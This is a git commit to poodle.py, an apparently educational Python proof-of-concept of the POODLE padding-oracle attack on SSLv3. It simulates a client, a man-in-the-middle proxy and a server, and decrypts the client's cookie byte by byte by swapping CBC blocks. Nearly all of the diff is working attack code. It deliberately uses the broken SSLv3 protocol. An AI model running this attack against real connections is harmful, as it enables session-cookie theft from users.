ade20374db505d3e5b376ff04a5127100daabf2d
martialdidit <martial.puygrenier@gmail.com>
2015-02-14 15:57:43 +0100

    Add optimisation alteration block
    Added percentage decipher - print plain text request in only one line
    Added comments on every Class
    Added ascii plan of the situation
    
    Remove useless file
    Remove print information

--- poodle.py
+++ poodle.py
@@ -3,6 +3,7 @@
 
 import argparse
 import random
+import re
 import select
 import socket
 import SocketServer
@@ -11,43 +12,38 @@ import string
 import sys
 import struct
 import threading
-import re
-import binascii
-import math
 from pprint import pprint
-from pyfancy import *
 from struct import *
 
 class SecureTCPHandler(SocketServer.BaseRequestHandler):
   def handle(self):
     self.request = ssl.wrap_socket(self.request, keyfile="cert/localhost.pem", certfile="cert/localhost.pem", server_side=True, ssl_version=ssl.PROTOCOL_SSLv3)
-
     #loop to avoid broken pipe
     while True:
         try:
             data = self.request.recv(1024)
             if data == '':
                 break
-
-            #print(pyfancy.LIGHTGREEN + 'The paquet is securely received: {}'.format(repr(data)) + pyfancy.END)
             self.request.send(b'OK')
         except ssl.SSLError as e:
             pass
     return
 
 class Server:
+    """The secure server.
+    A sample server, serving on his host and port waiting the client 
+    """
     def __init__(self, host, port):
         self.host = host
         self.port = port
 
     def connection(self):
         SocketServer.TCPServer.allow_reuse_address = True
-        httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
-        server = threading.Thread(target=httpd.serve_forever)
+        self.httpd = SocketServer.TCPServer((self.host, self.port), SecureTCPHandler)
+        server = threading.Thread(target=self.httpd.serve_forever)
         server.daemon=True
         server.start()
         print('Server is serving HTTPS on {!r} port {}'.format(self.host, self.port))
-        self.httpd = httpd
         return
 
     def get_host(self):
@@ -62,30 +58,25 @@ class Server:
         return
 
 class Client:
+    """ The unsecure post of the client can be a "unsecure" browser for example.
+    The client generate a random cookie and send it to the server through the proxy
+    The attacker by injecting javascript code can control the sending request of the client to the proxy -> server
+    """
 
     def __init__(self, host, port):
         self.proxy_host = host
         self.proxy_port = port
-        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(15))
+        self.cookie = ''.join(random.SystemRandom().choice(string.uppercase + string.digits + string.lowercase) for _ in xrange(8))
 
     def connection(self):
-        #print pyfancy.PINK + "Client " + pyfancy.END + " --> " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END
-        #print('Client connected to the proxy\n')
-       # print('Client do handshake with the server')
-        ssl_sock = socket.create_connection((self.proxy_host, self.proxy_port))
-        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3, cert_reqs=ssl.CERT_NONE)
         # Initialization of the client
-        # purpose = ssl.Purpose.SERVER_AUTH
-        # context = ssl.SSLContext(ssl.PROTOCOL_SSLv3)
-        # raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        # ssl_sock = context.wrap_socket(raw_sock, server_hostname=self.proxy_host)
-        # # Connexion to the proxy
-        # ssl_sock.connect((self.proxy_host, self.proxy_port))
+        ssl_sock = socket.create_connection((self.proxy_host, self.proxy_port))
+        ssl_sock = ssl.wrap_socket(ssl_sock, server_side=False, ssl_version=ssl.PROTOCOL_SSLv3)
+        
         self.socket = ssl_sock
         return
     
     def request_cookie(self, path=0, data=0):
-        #print('Cliend send request with a cookie...')
         srt_path = ''
         srt_data = ''
         for x in range(0,path):
@@ -95,19 +86,21 @@ class Client:
         try:
             self.socket.sendall(b"GET /"+ srt_path +" HTTP/1.1\r\nCookie: " + self.cookie + "\r\n\r\n" + srt_data)
             msg = "".join([str(i) for i in self.socket.recv(1024).split(b"\r\n")])
-            #print("[" + pyfancy.GREEN + msg + pyfancy.END + "] Client received confirmation from the server")
         except ssl.SSLError as e:
             pass
         pass
         return
 
     def disconnect(self):
-        #print("Client disconnect")
         self.socket.close()
         return
 
 class ProxyTCPHandler(SocketServer.BaseRequestHandler):
-
+    """ 
+    Start a connection to the secure server and handle multiple socket connections between the client and the server
+    Informe the attacker about the client's frames or the server's response
+    Finally redirect the data from the client to the server and inversely
+    """
     def handle(self):
 
         # Connection to the secure server
@@ -122,8 +115,6 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
             for source in readable:
                 if source is socket_server:
 
-                    #print pyfancy.PINK + "Client " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END + " <----- " + pyfancy.BLUE +"Server" + pyfancy.END
-
                     data = socket_server.recv(1024)
                     if len(data) == 0:
                         running = False
@@ -131,18 +122,13 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
 
                     if poodle.get_start_exploit() is True:
                         (content_type, version, length) = struct.unpack('>BHH', data[0:5])
-                        #print "content type " + str(content_type)
                         if content_type == 23:
-                            #print "The block can be decipher"
                             poodle.set_decipherable(True)
-                        #if content_type == 21:
-                            #print "The request is altered MAC error"
                     
                     # we send data to the client
                     self.request.send(data)
 
                 elif source is self.request:
-                    #print pyfancy.PINK + "Client " + pyfancy.END + " --> " + pyfancy.END + pyfancy.BOLD + "[proxy]" + pyfancy.END + " -----> " + pyfancy.BLUE + "Server" + pyfancy.END
                     
                     ssl_header = self.request.recv(5)
                     if ssl_header == '':
@@ -167,7 +153,9 @@ class ProxyTCPHandler(SocketServer.BaseRequestHandler):
         return
 
 class Proxy:
-
+    """ Assimilate to a MitmProxy
+    start a serving on his host and port and redirect the data to the server due to this handler
+    """
     def __init__(self, host, port):
         self.host = host
         self.port = port
@@ -188,6 +176,10 @@ class Proxy:
         return
 
 class Poodle(Client):
+    """ Assimilate to the attacker
+    detect the length of a CBC block
+    alter the ethernet frame of the client to decipher a byte regarding the proxy informations
+    """
 
     def __init__(self, client):
         self.client = client
@@ -195,16 +187,19 @@ class Poodle(Client):
         self.start_exploit = False
         self.nb_prefix = 0
         self.decipherable = False
-        self.plaintext = ""
+        self.plaintext = []
+        self.request = ''
+        self.byte_decipher = 0
 
-    def test_poodle_attack(self):
+    def poodle_attack(self):
         self.client_connection()
         self.size_of_block()
         self.start_exploit = True
-        # we disconnect the client to avoid "connection reset by peer"
+        # disconnect the client to avoid "connection reset by peer"
         self.client_disconect()
+        print "Start decrypting the request...\n"
         self.exploit()
-        print ''.join(map(str, self.plaintext))
+        print '\n'
         self.client_disconect()
         return
 
@@ -216,43 +211,47 @@ class Poodle(Client):
         self.length_frame = len(data)
 
     def exploit(self):
-        for i in range(1,self.length_frame/self.length_block):
+        # start at block 2, finish at block n-1
+        for i in range(1,(self.length_frame/self.length_block) - 1):
+            self.current_block = i
             for j in reversed(range(self.length_block)):
-                self.current_block = i
-                self.find_plaintext_byte(self.frame,j)
+                byte_found = self.find_plaintext_byte(self.frame,j)
+                self.request += re.sub('[\r\n]', ' ', byte_found)
+                percent = 100.0 * self.byte_decipher / (self.length_frame - 2 * self.length_block)
+                sys.stdout.write("\rProgression %.0f%% - %s" % (percent, self.request))
+                sys.stdout.flush()
         return
 
     def choosing_block(self, current_block):
         return self.frame[current_block * self.length_block:(current_block + 1) * self.length_block]
 
-    def find_plaintext_byte(self, frame, byte=None):
+    def find_plaintext_byte(self, frame, byte):
         i = 0
         while True:
-            self.byte_find = False
             self.client_connection()
 
-            prefix_length = self.length_block + byte
-            suffix_length = self.length_block - byte
-
+            prefix_length = (byte + 1)
+            suffix_length = self.length_block - (byte + 1)            
+            
             self.send_request_from_the_client(self.nb_prefix+prefix_length, suffix_length)
             self.client_disconect()
             if self.decipherable is True:
+                self.byte_decipher += 1
                 plain = self.decipher(self.frame)
-                self.plaintext += chr(plain)
-                sys.stdout.write("Decrypt the plain text: %s \r" % (self.plaintext))
-                sys.stdout.flush()
                 self.decipherable = False
                 break
             i += 1
-        return
+        return chr(plain)
 
     def decipher(self, data):
         return self.choosing_block(self.current_block-1)[-1] ^ self.choosing_block(-2)[-1] ^ (self.length_block-1)
 
     def set_decipherable(self, status):
         self.decipherable = status
+        return
 
     def size_of_block(self):
+        print "Begins searching the size of a block...\n"
         self.send_request_from_the_client()
         reference_length = self.length_frame
         i = 0
@@ -262,43 +261,54 @@ class Poodle(Client):
             self.length_block = current_length - reference_length
             if self.length_block != 0:
                 self.nb_prefix = i
-                print "Succes block size " + str(self.length_block)
-                print "number prefixe " + str(i)
+                print "CBC block size " + str(self.length_block) + "\n"
                 break
             i += 1
 
     def alter(self):
         if self.start_exploit is True:
-            #print binascii.hexlify(self.frame)
             self.frame = bytearray(self.frame)
             self.frame = self.frame[:-self.length_block] + self.choosing_block(self.current_block)
-            #print binascii.hexlify(self.frame)
             return str(self.frame)
         return self.frame
 
-
     def client_connection(self):
-        #print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.connection()
         return
 
     def send_request_from_the_client(self, path=0, data=0):
-        #print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.request_cookie(path,data)
         return
 
     def client_disconect(self):
-        #print pyfancy.PINK + "\nClient " + pyfancy.END + " <-- " + pyfancy.END + pyfancy.RED + "Attacker" + pyfancy.END
         self.client.disconnect()
         return
 
 if __name__ == '__main__':
+
+    plan = """\
+
+    +----------------------+         +---------------------+          +-----------------------+
+    |                      +-------> |                     +--------> |                       |
+    |        Client        |         |        Proxy        |          |        Server         |
+    |                      | <-------+                     | <--------+                       |
+    +----------------------+         +-----+--------+------+          +-----------------------+
+                                           |        |                                          
+                 ^                         |        |                                          
+                 |                   +-----v--------+------+                                   
+                 |                   |                     |                                   
+                 +--------+----------+       Attacker      |                                   
+                 inject javascript   |                     |                                   
+                                     +---------------------+ 
+    """                              
 
     parser = argparse.ArgumentParser(description='Connection with SSLv3')
     parser.add_argument('host', help='hostname or IP address')
     parser.add_argument('port', type=int, help='TCP port number')
     parser.add_argument('-v', help='debug mode', action="store_true")
     args = parser.parse_args()
+
+    print plan + "\n"
 
     server  = Server(args.host, args.port)
     client  = Client(args.host, args.port+1)
@@ -308,9 +318,7 @@ if __name__ == '__main__':
     server.connection()
     spy.connection()
 
-    poodle.test_poodle_attack()
+    poodle.poodle_attack()
 
     spy.disconnect()
     server.disconnect()
-    
-
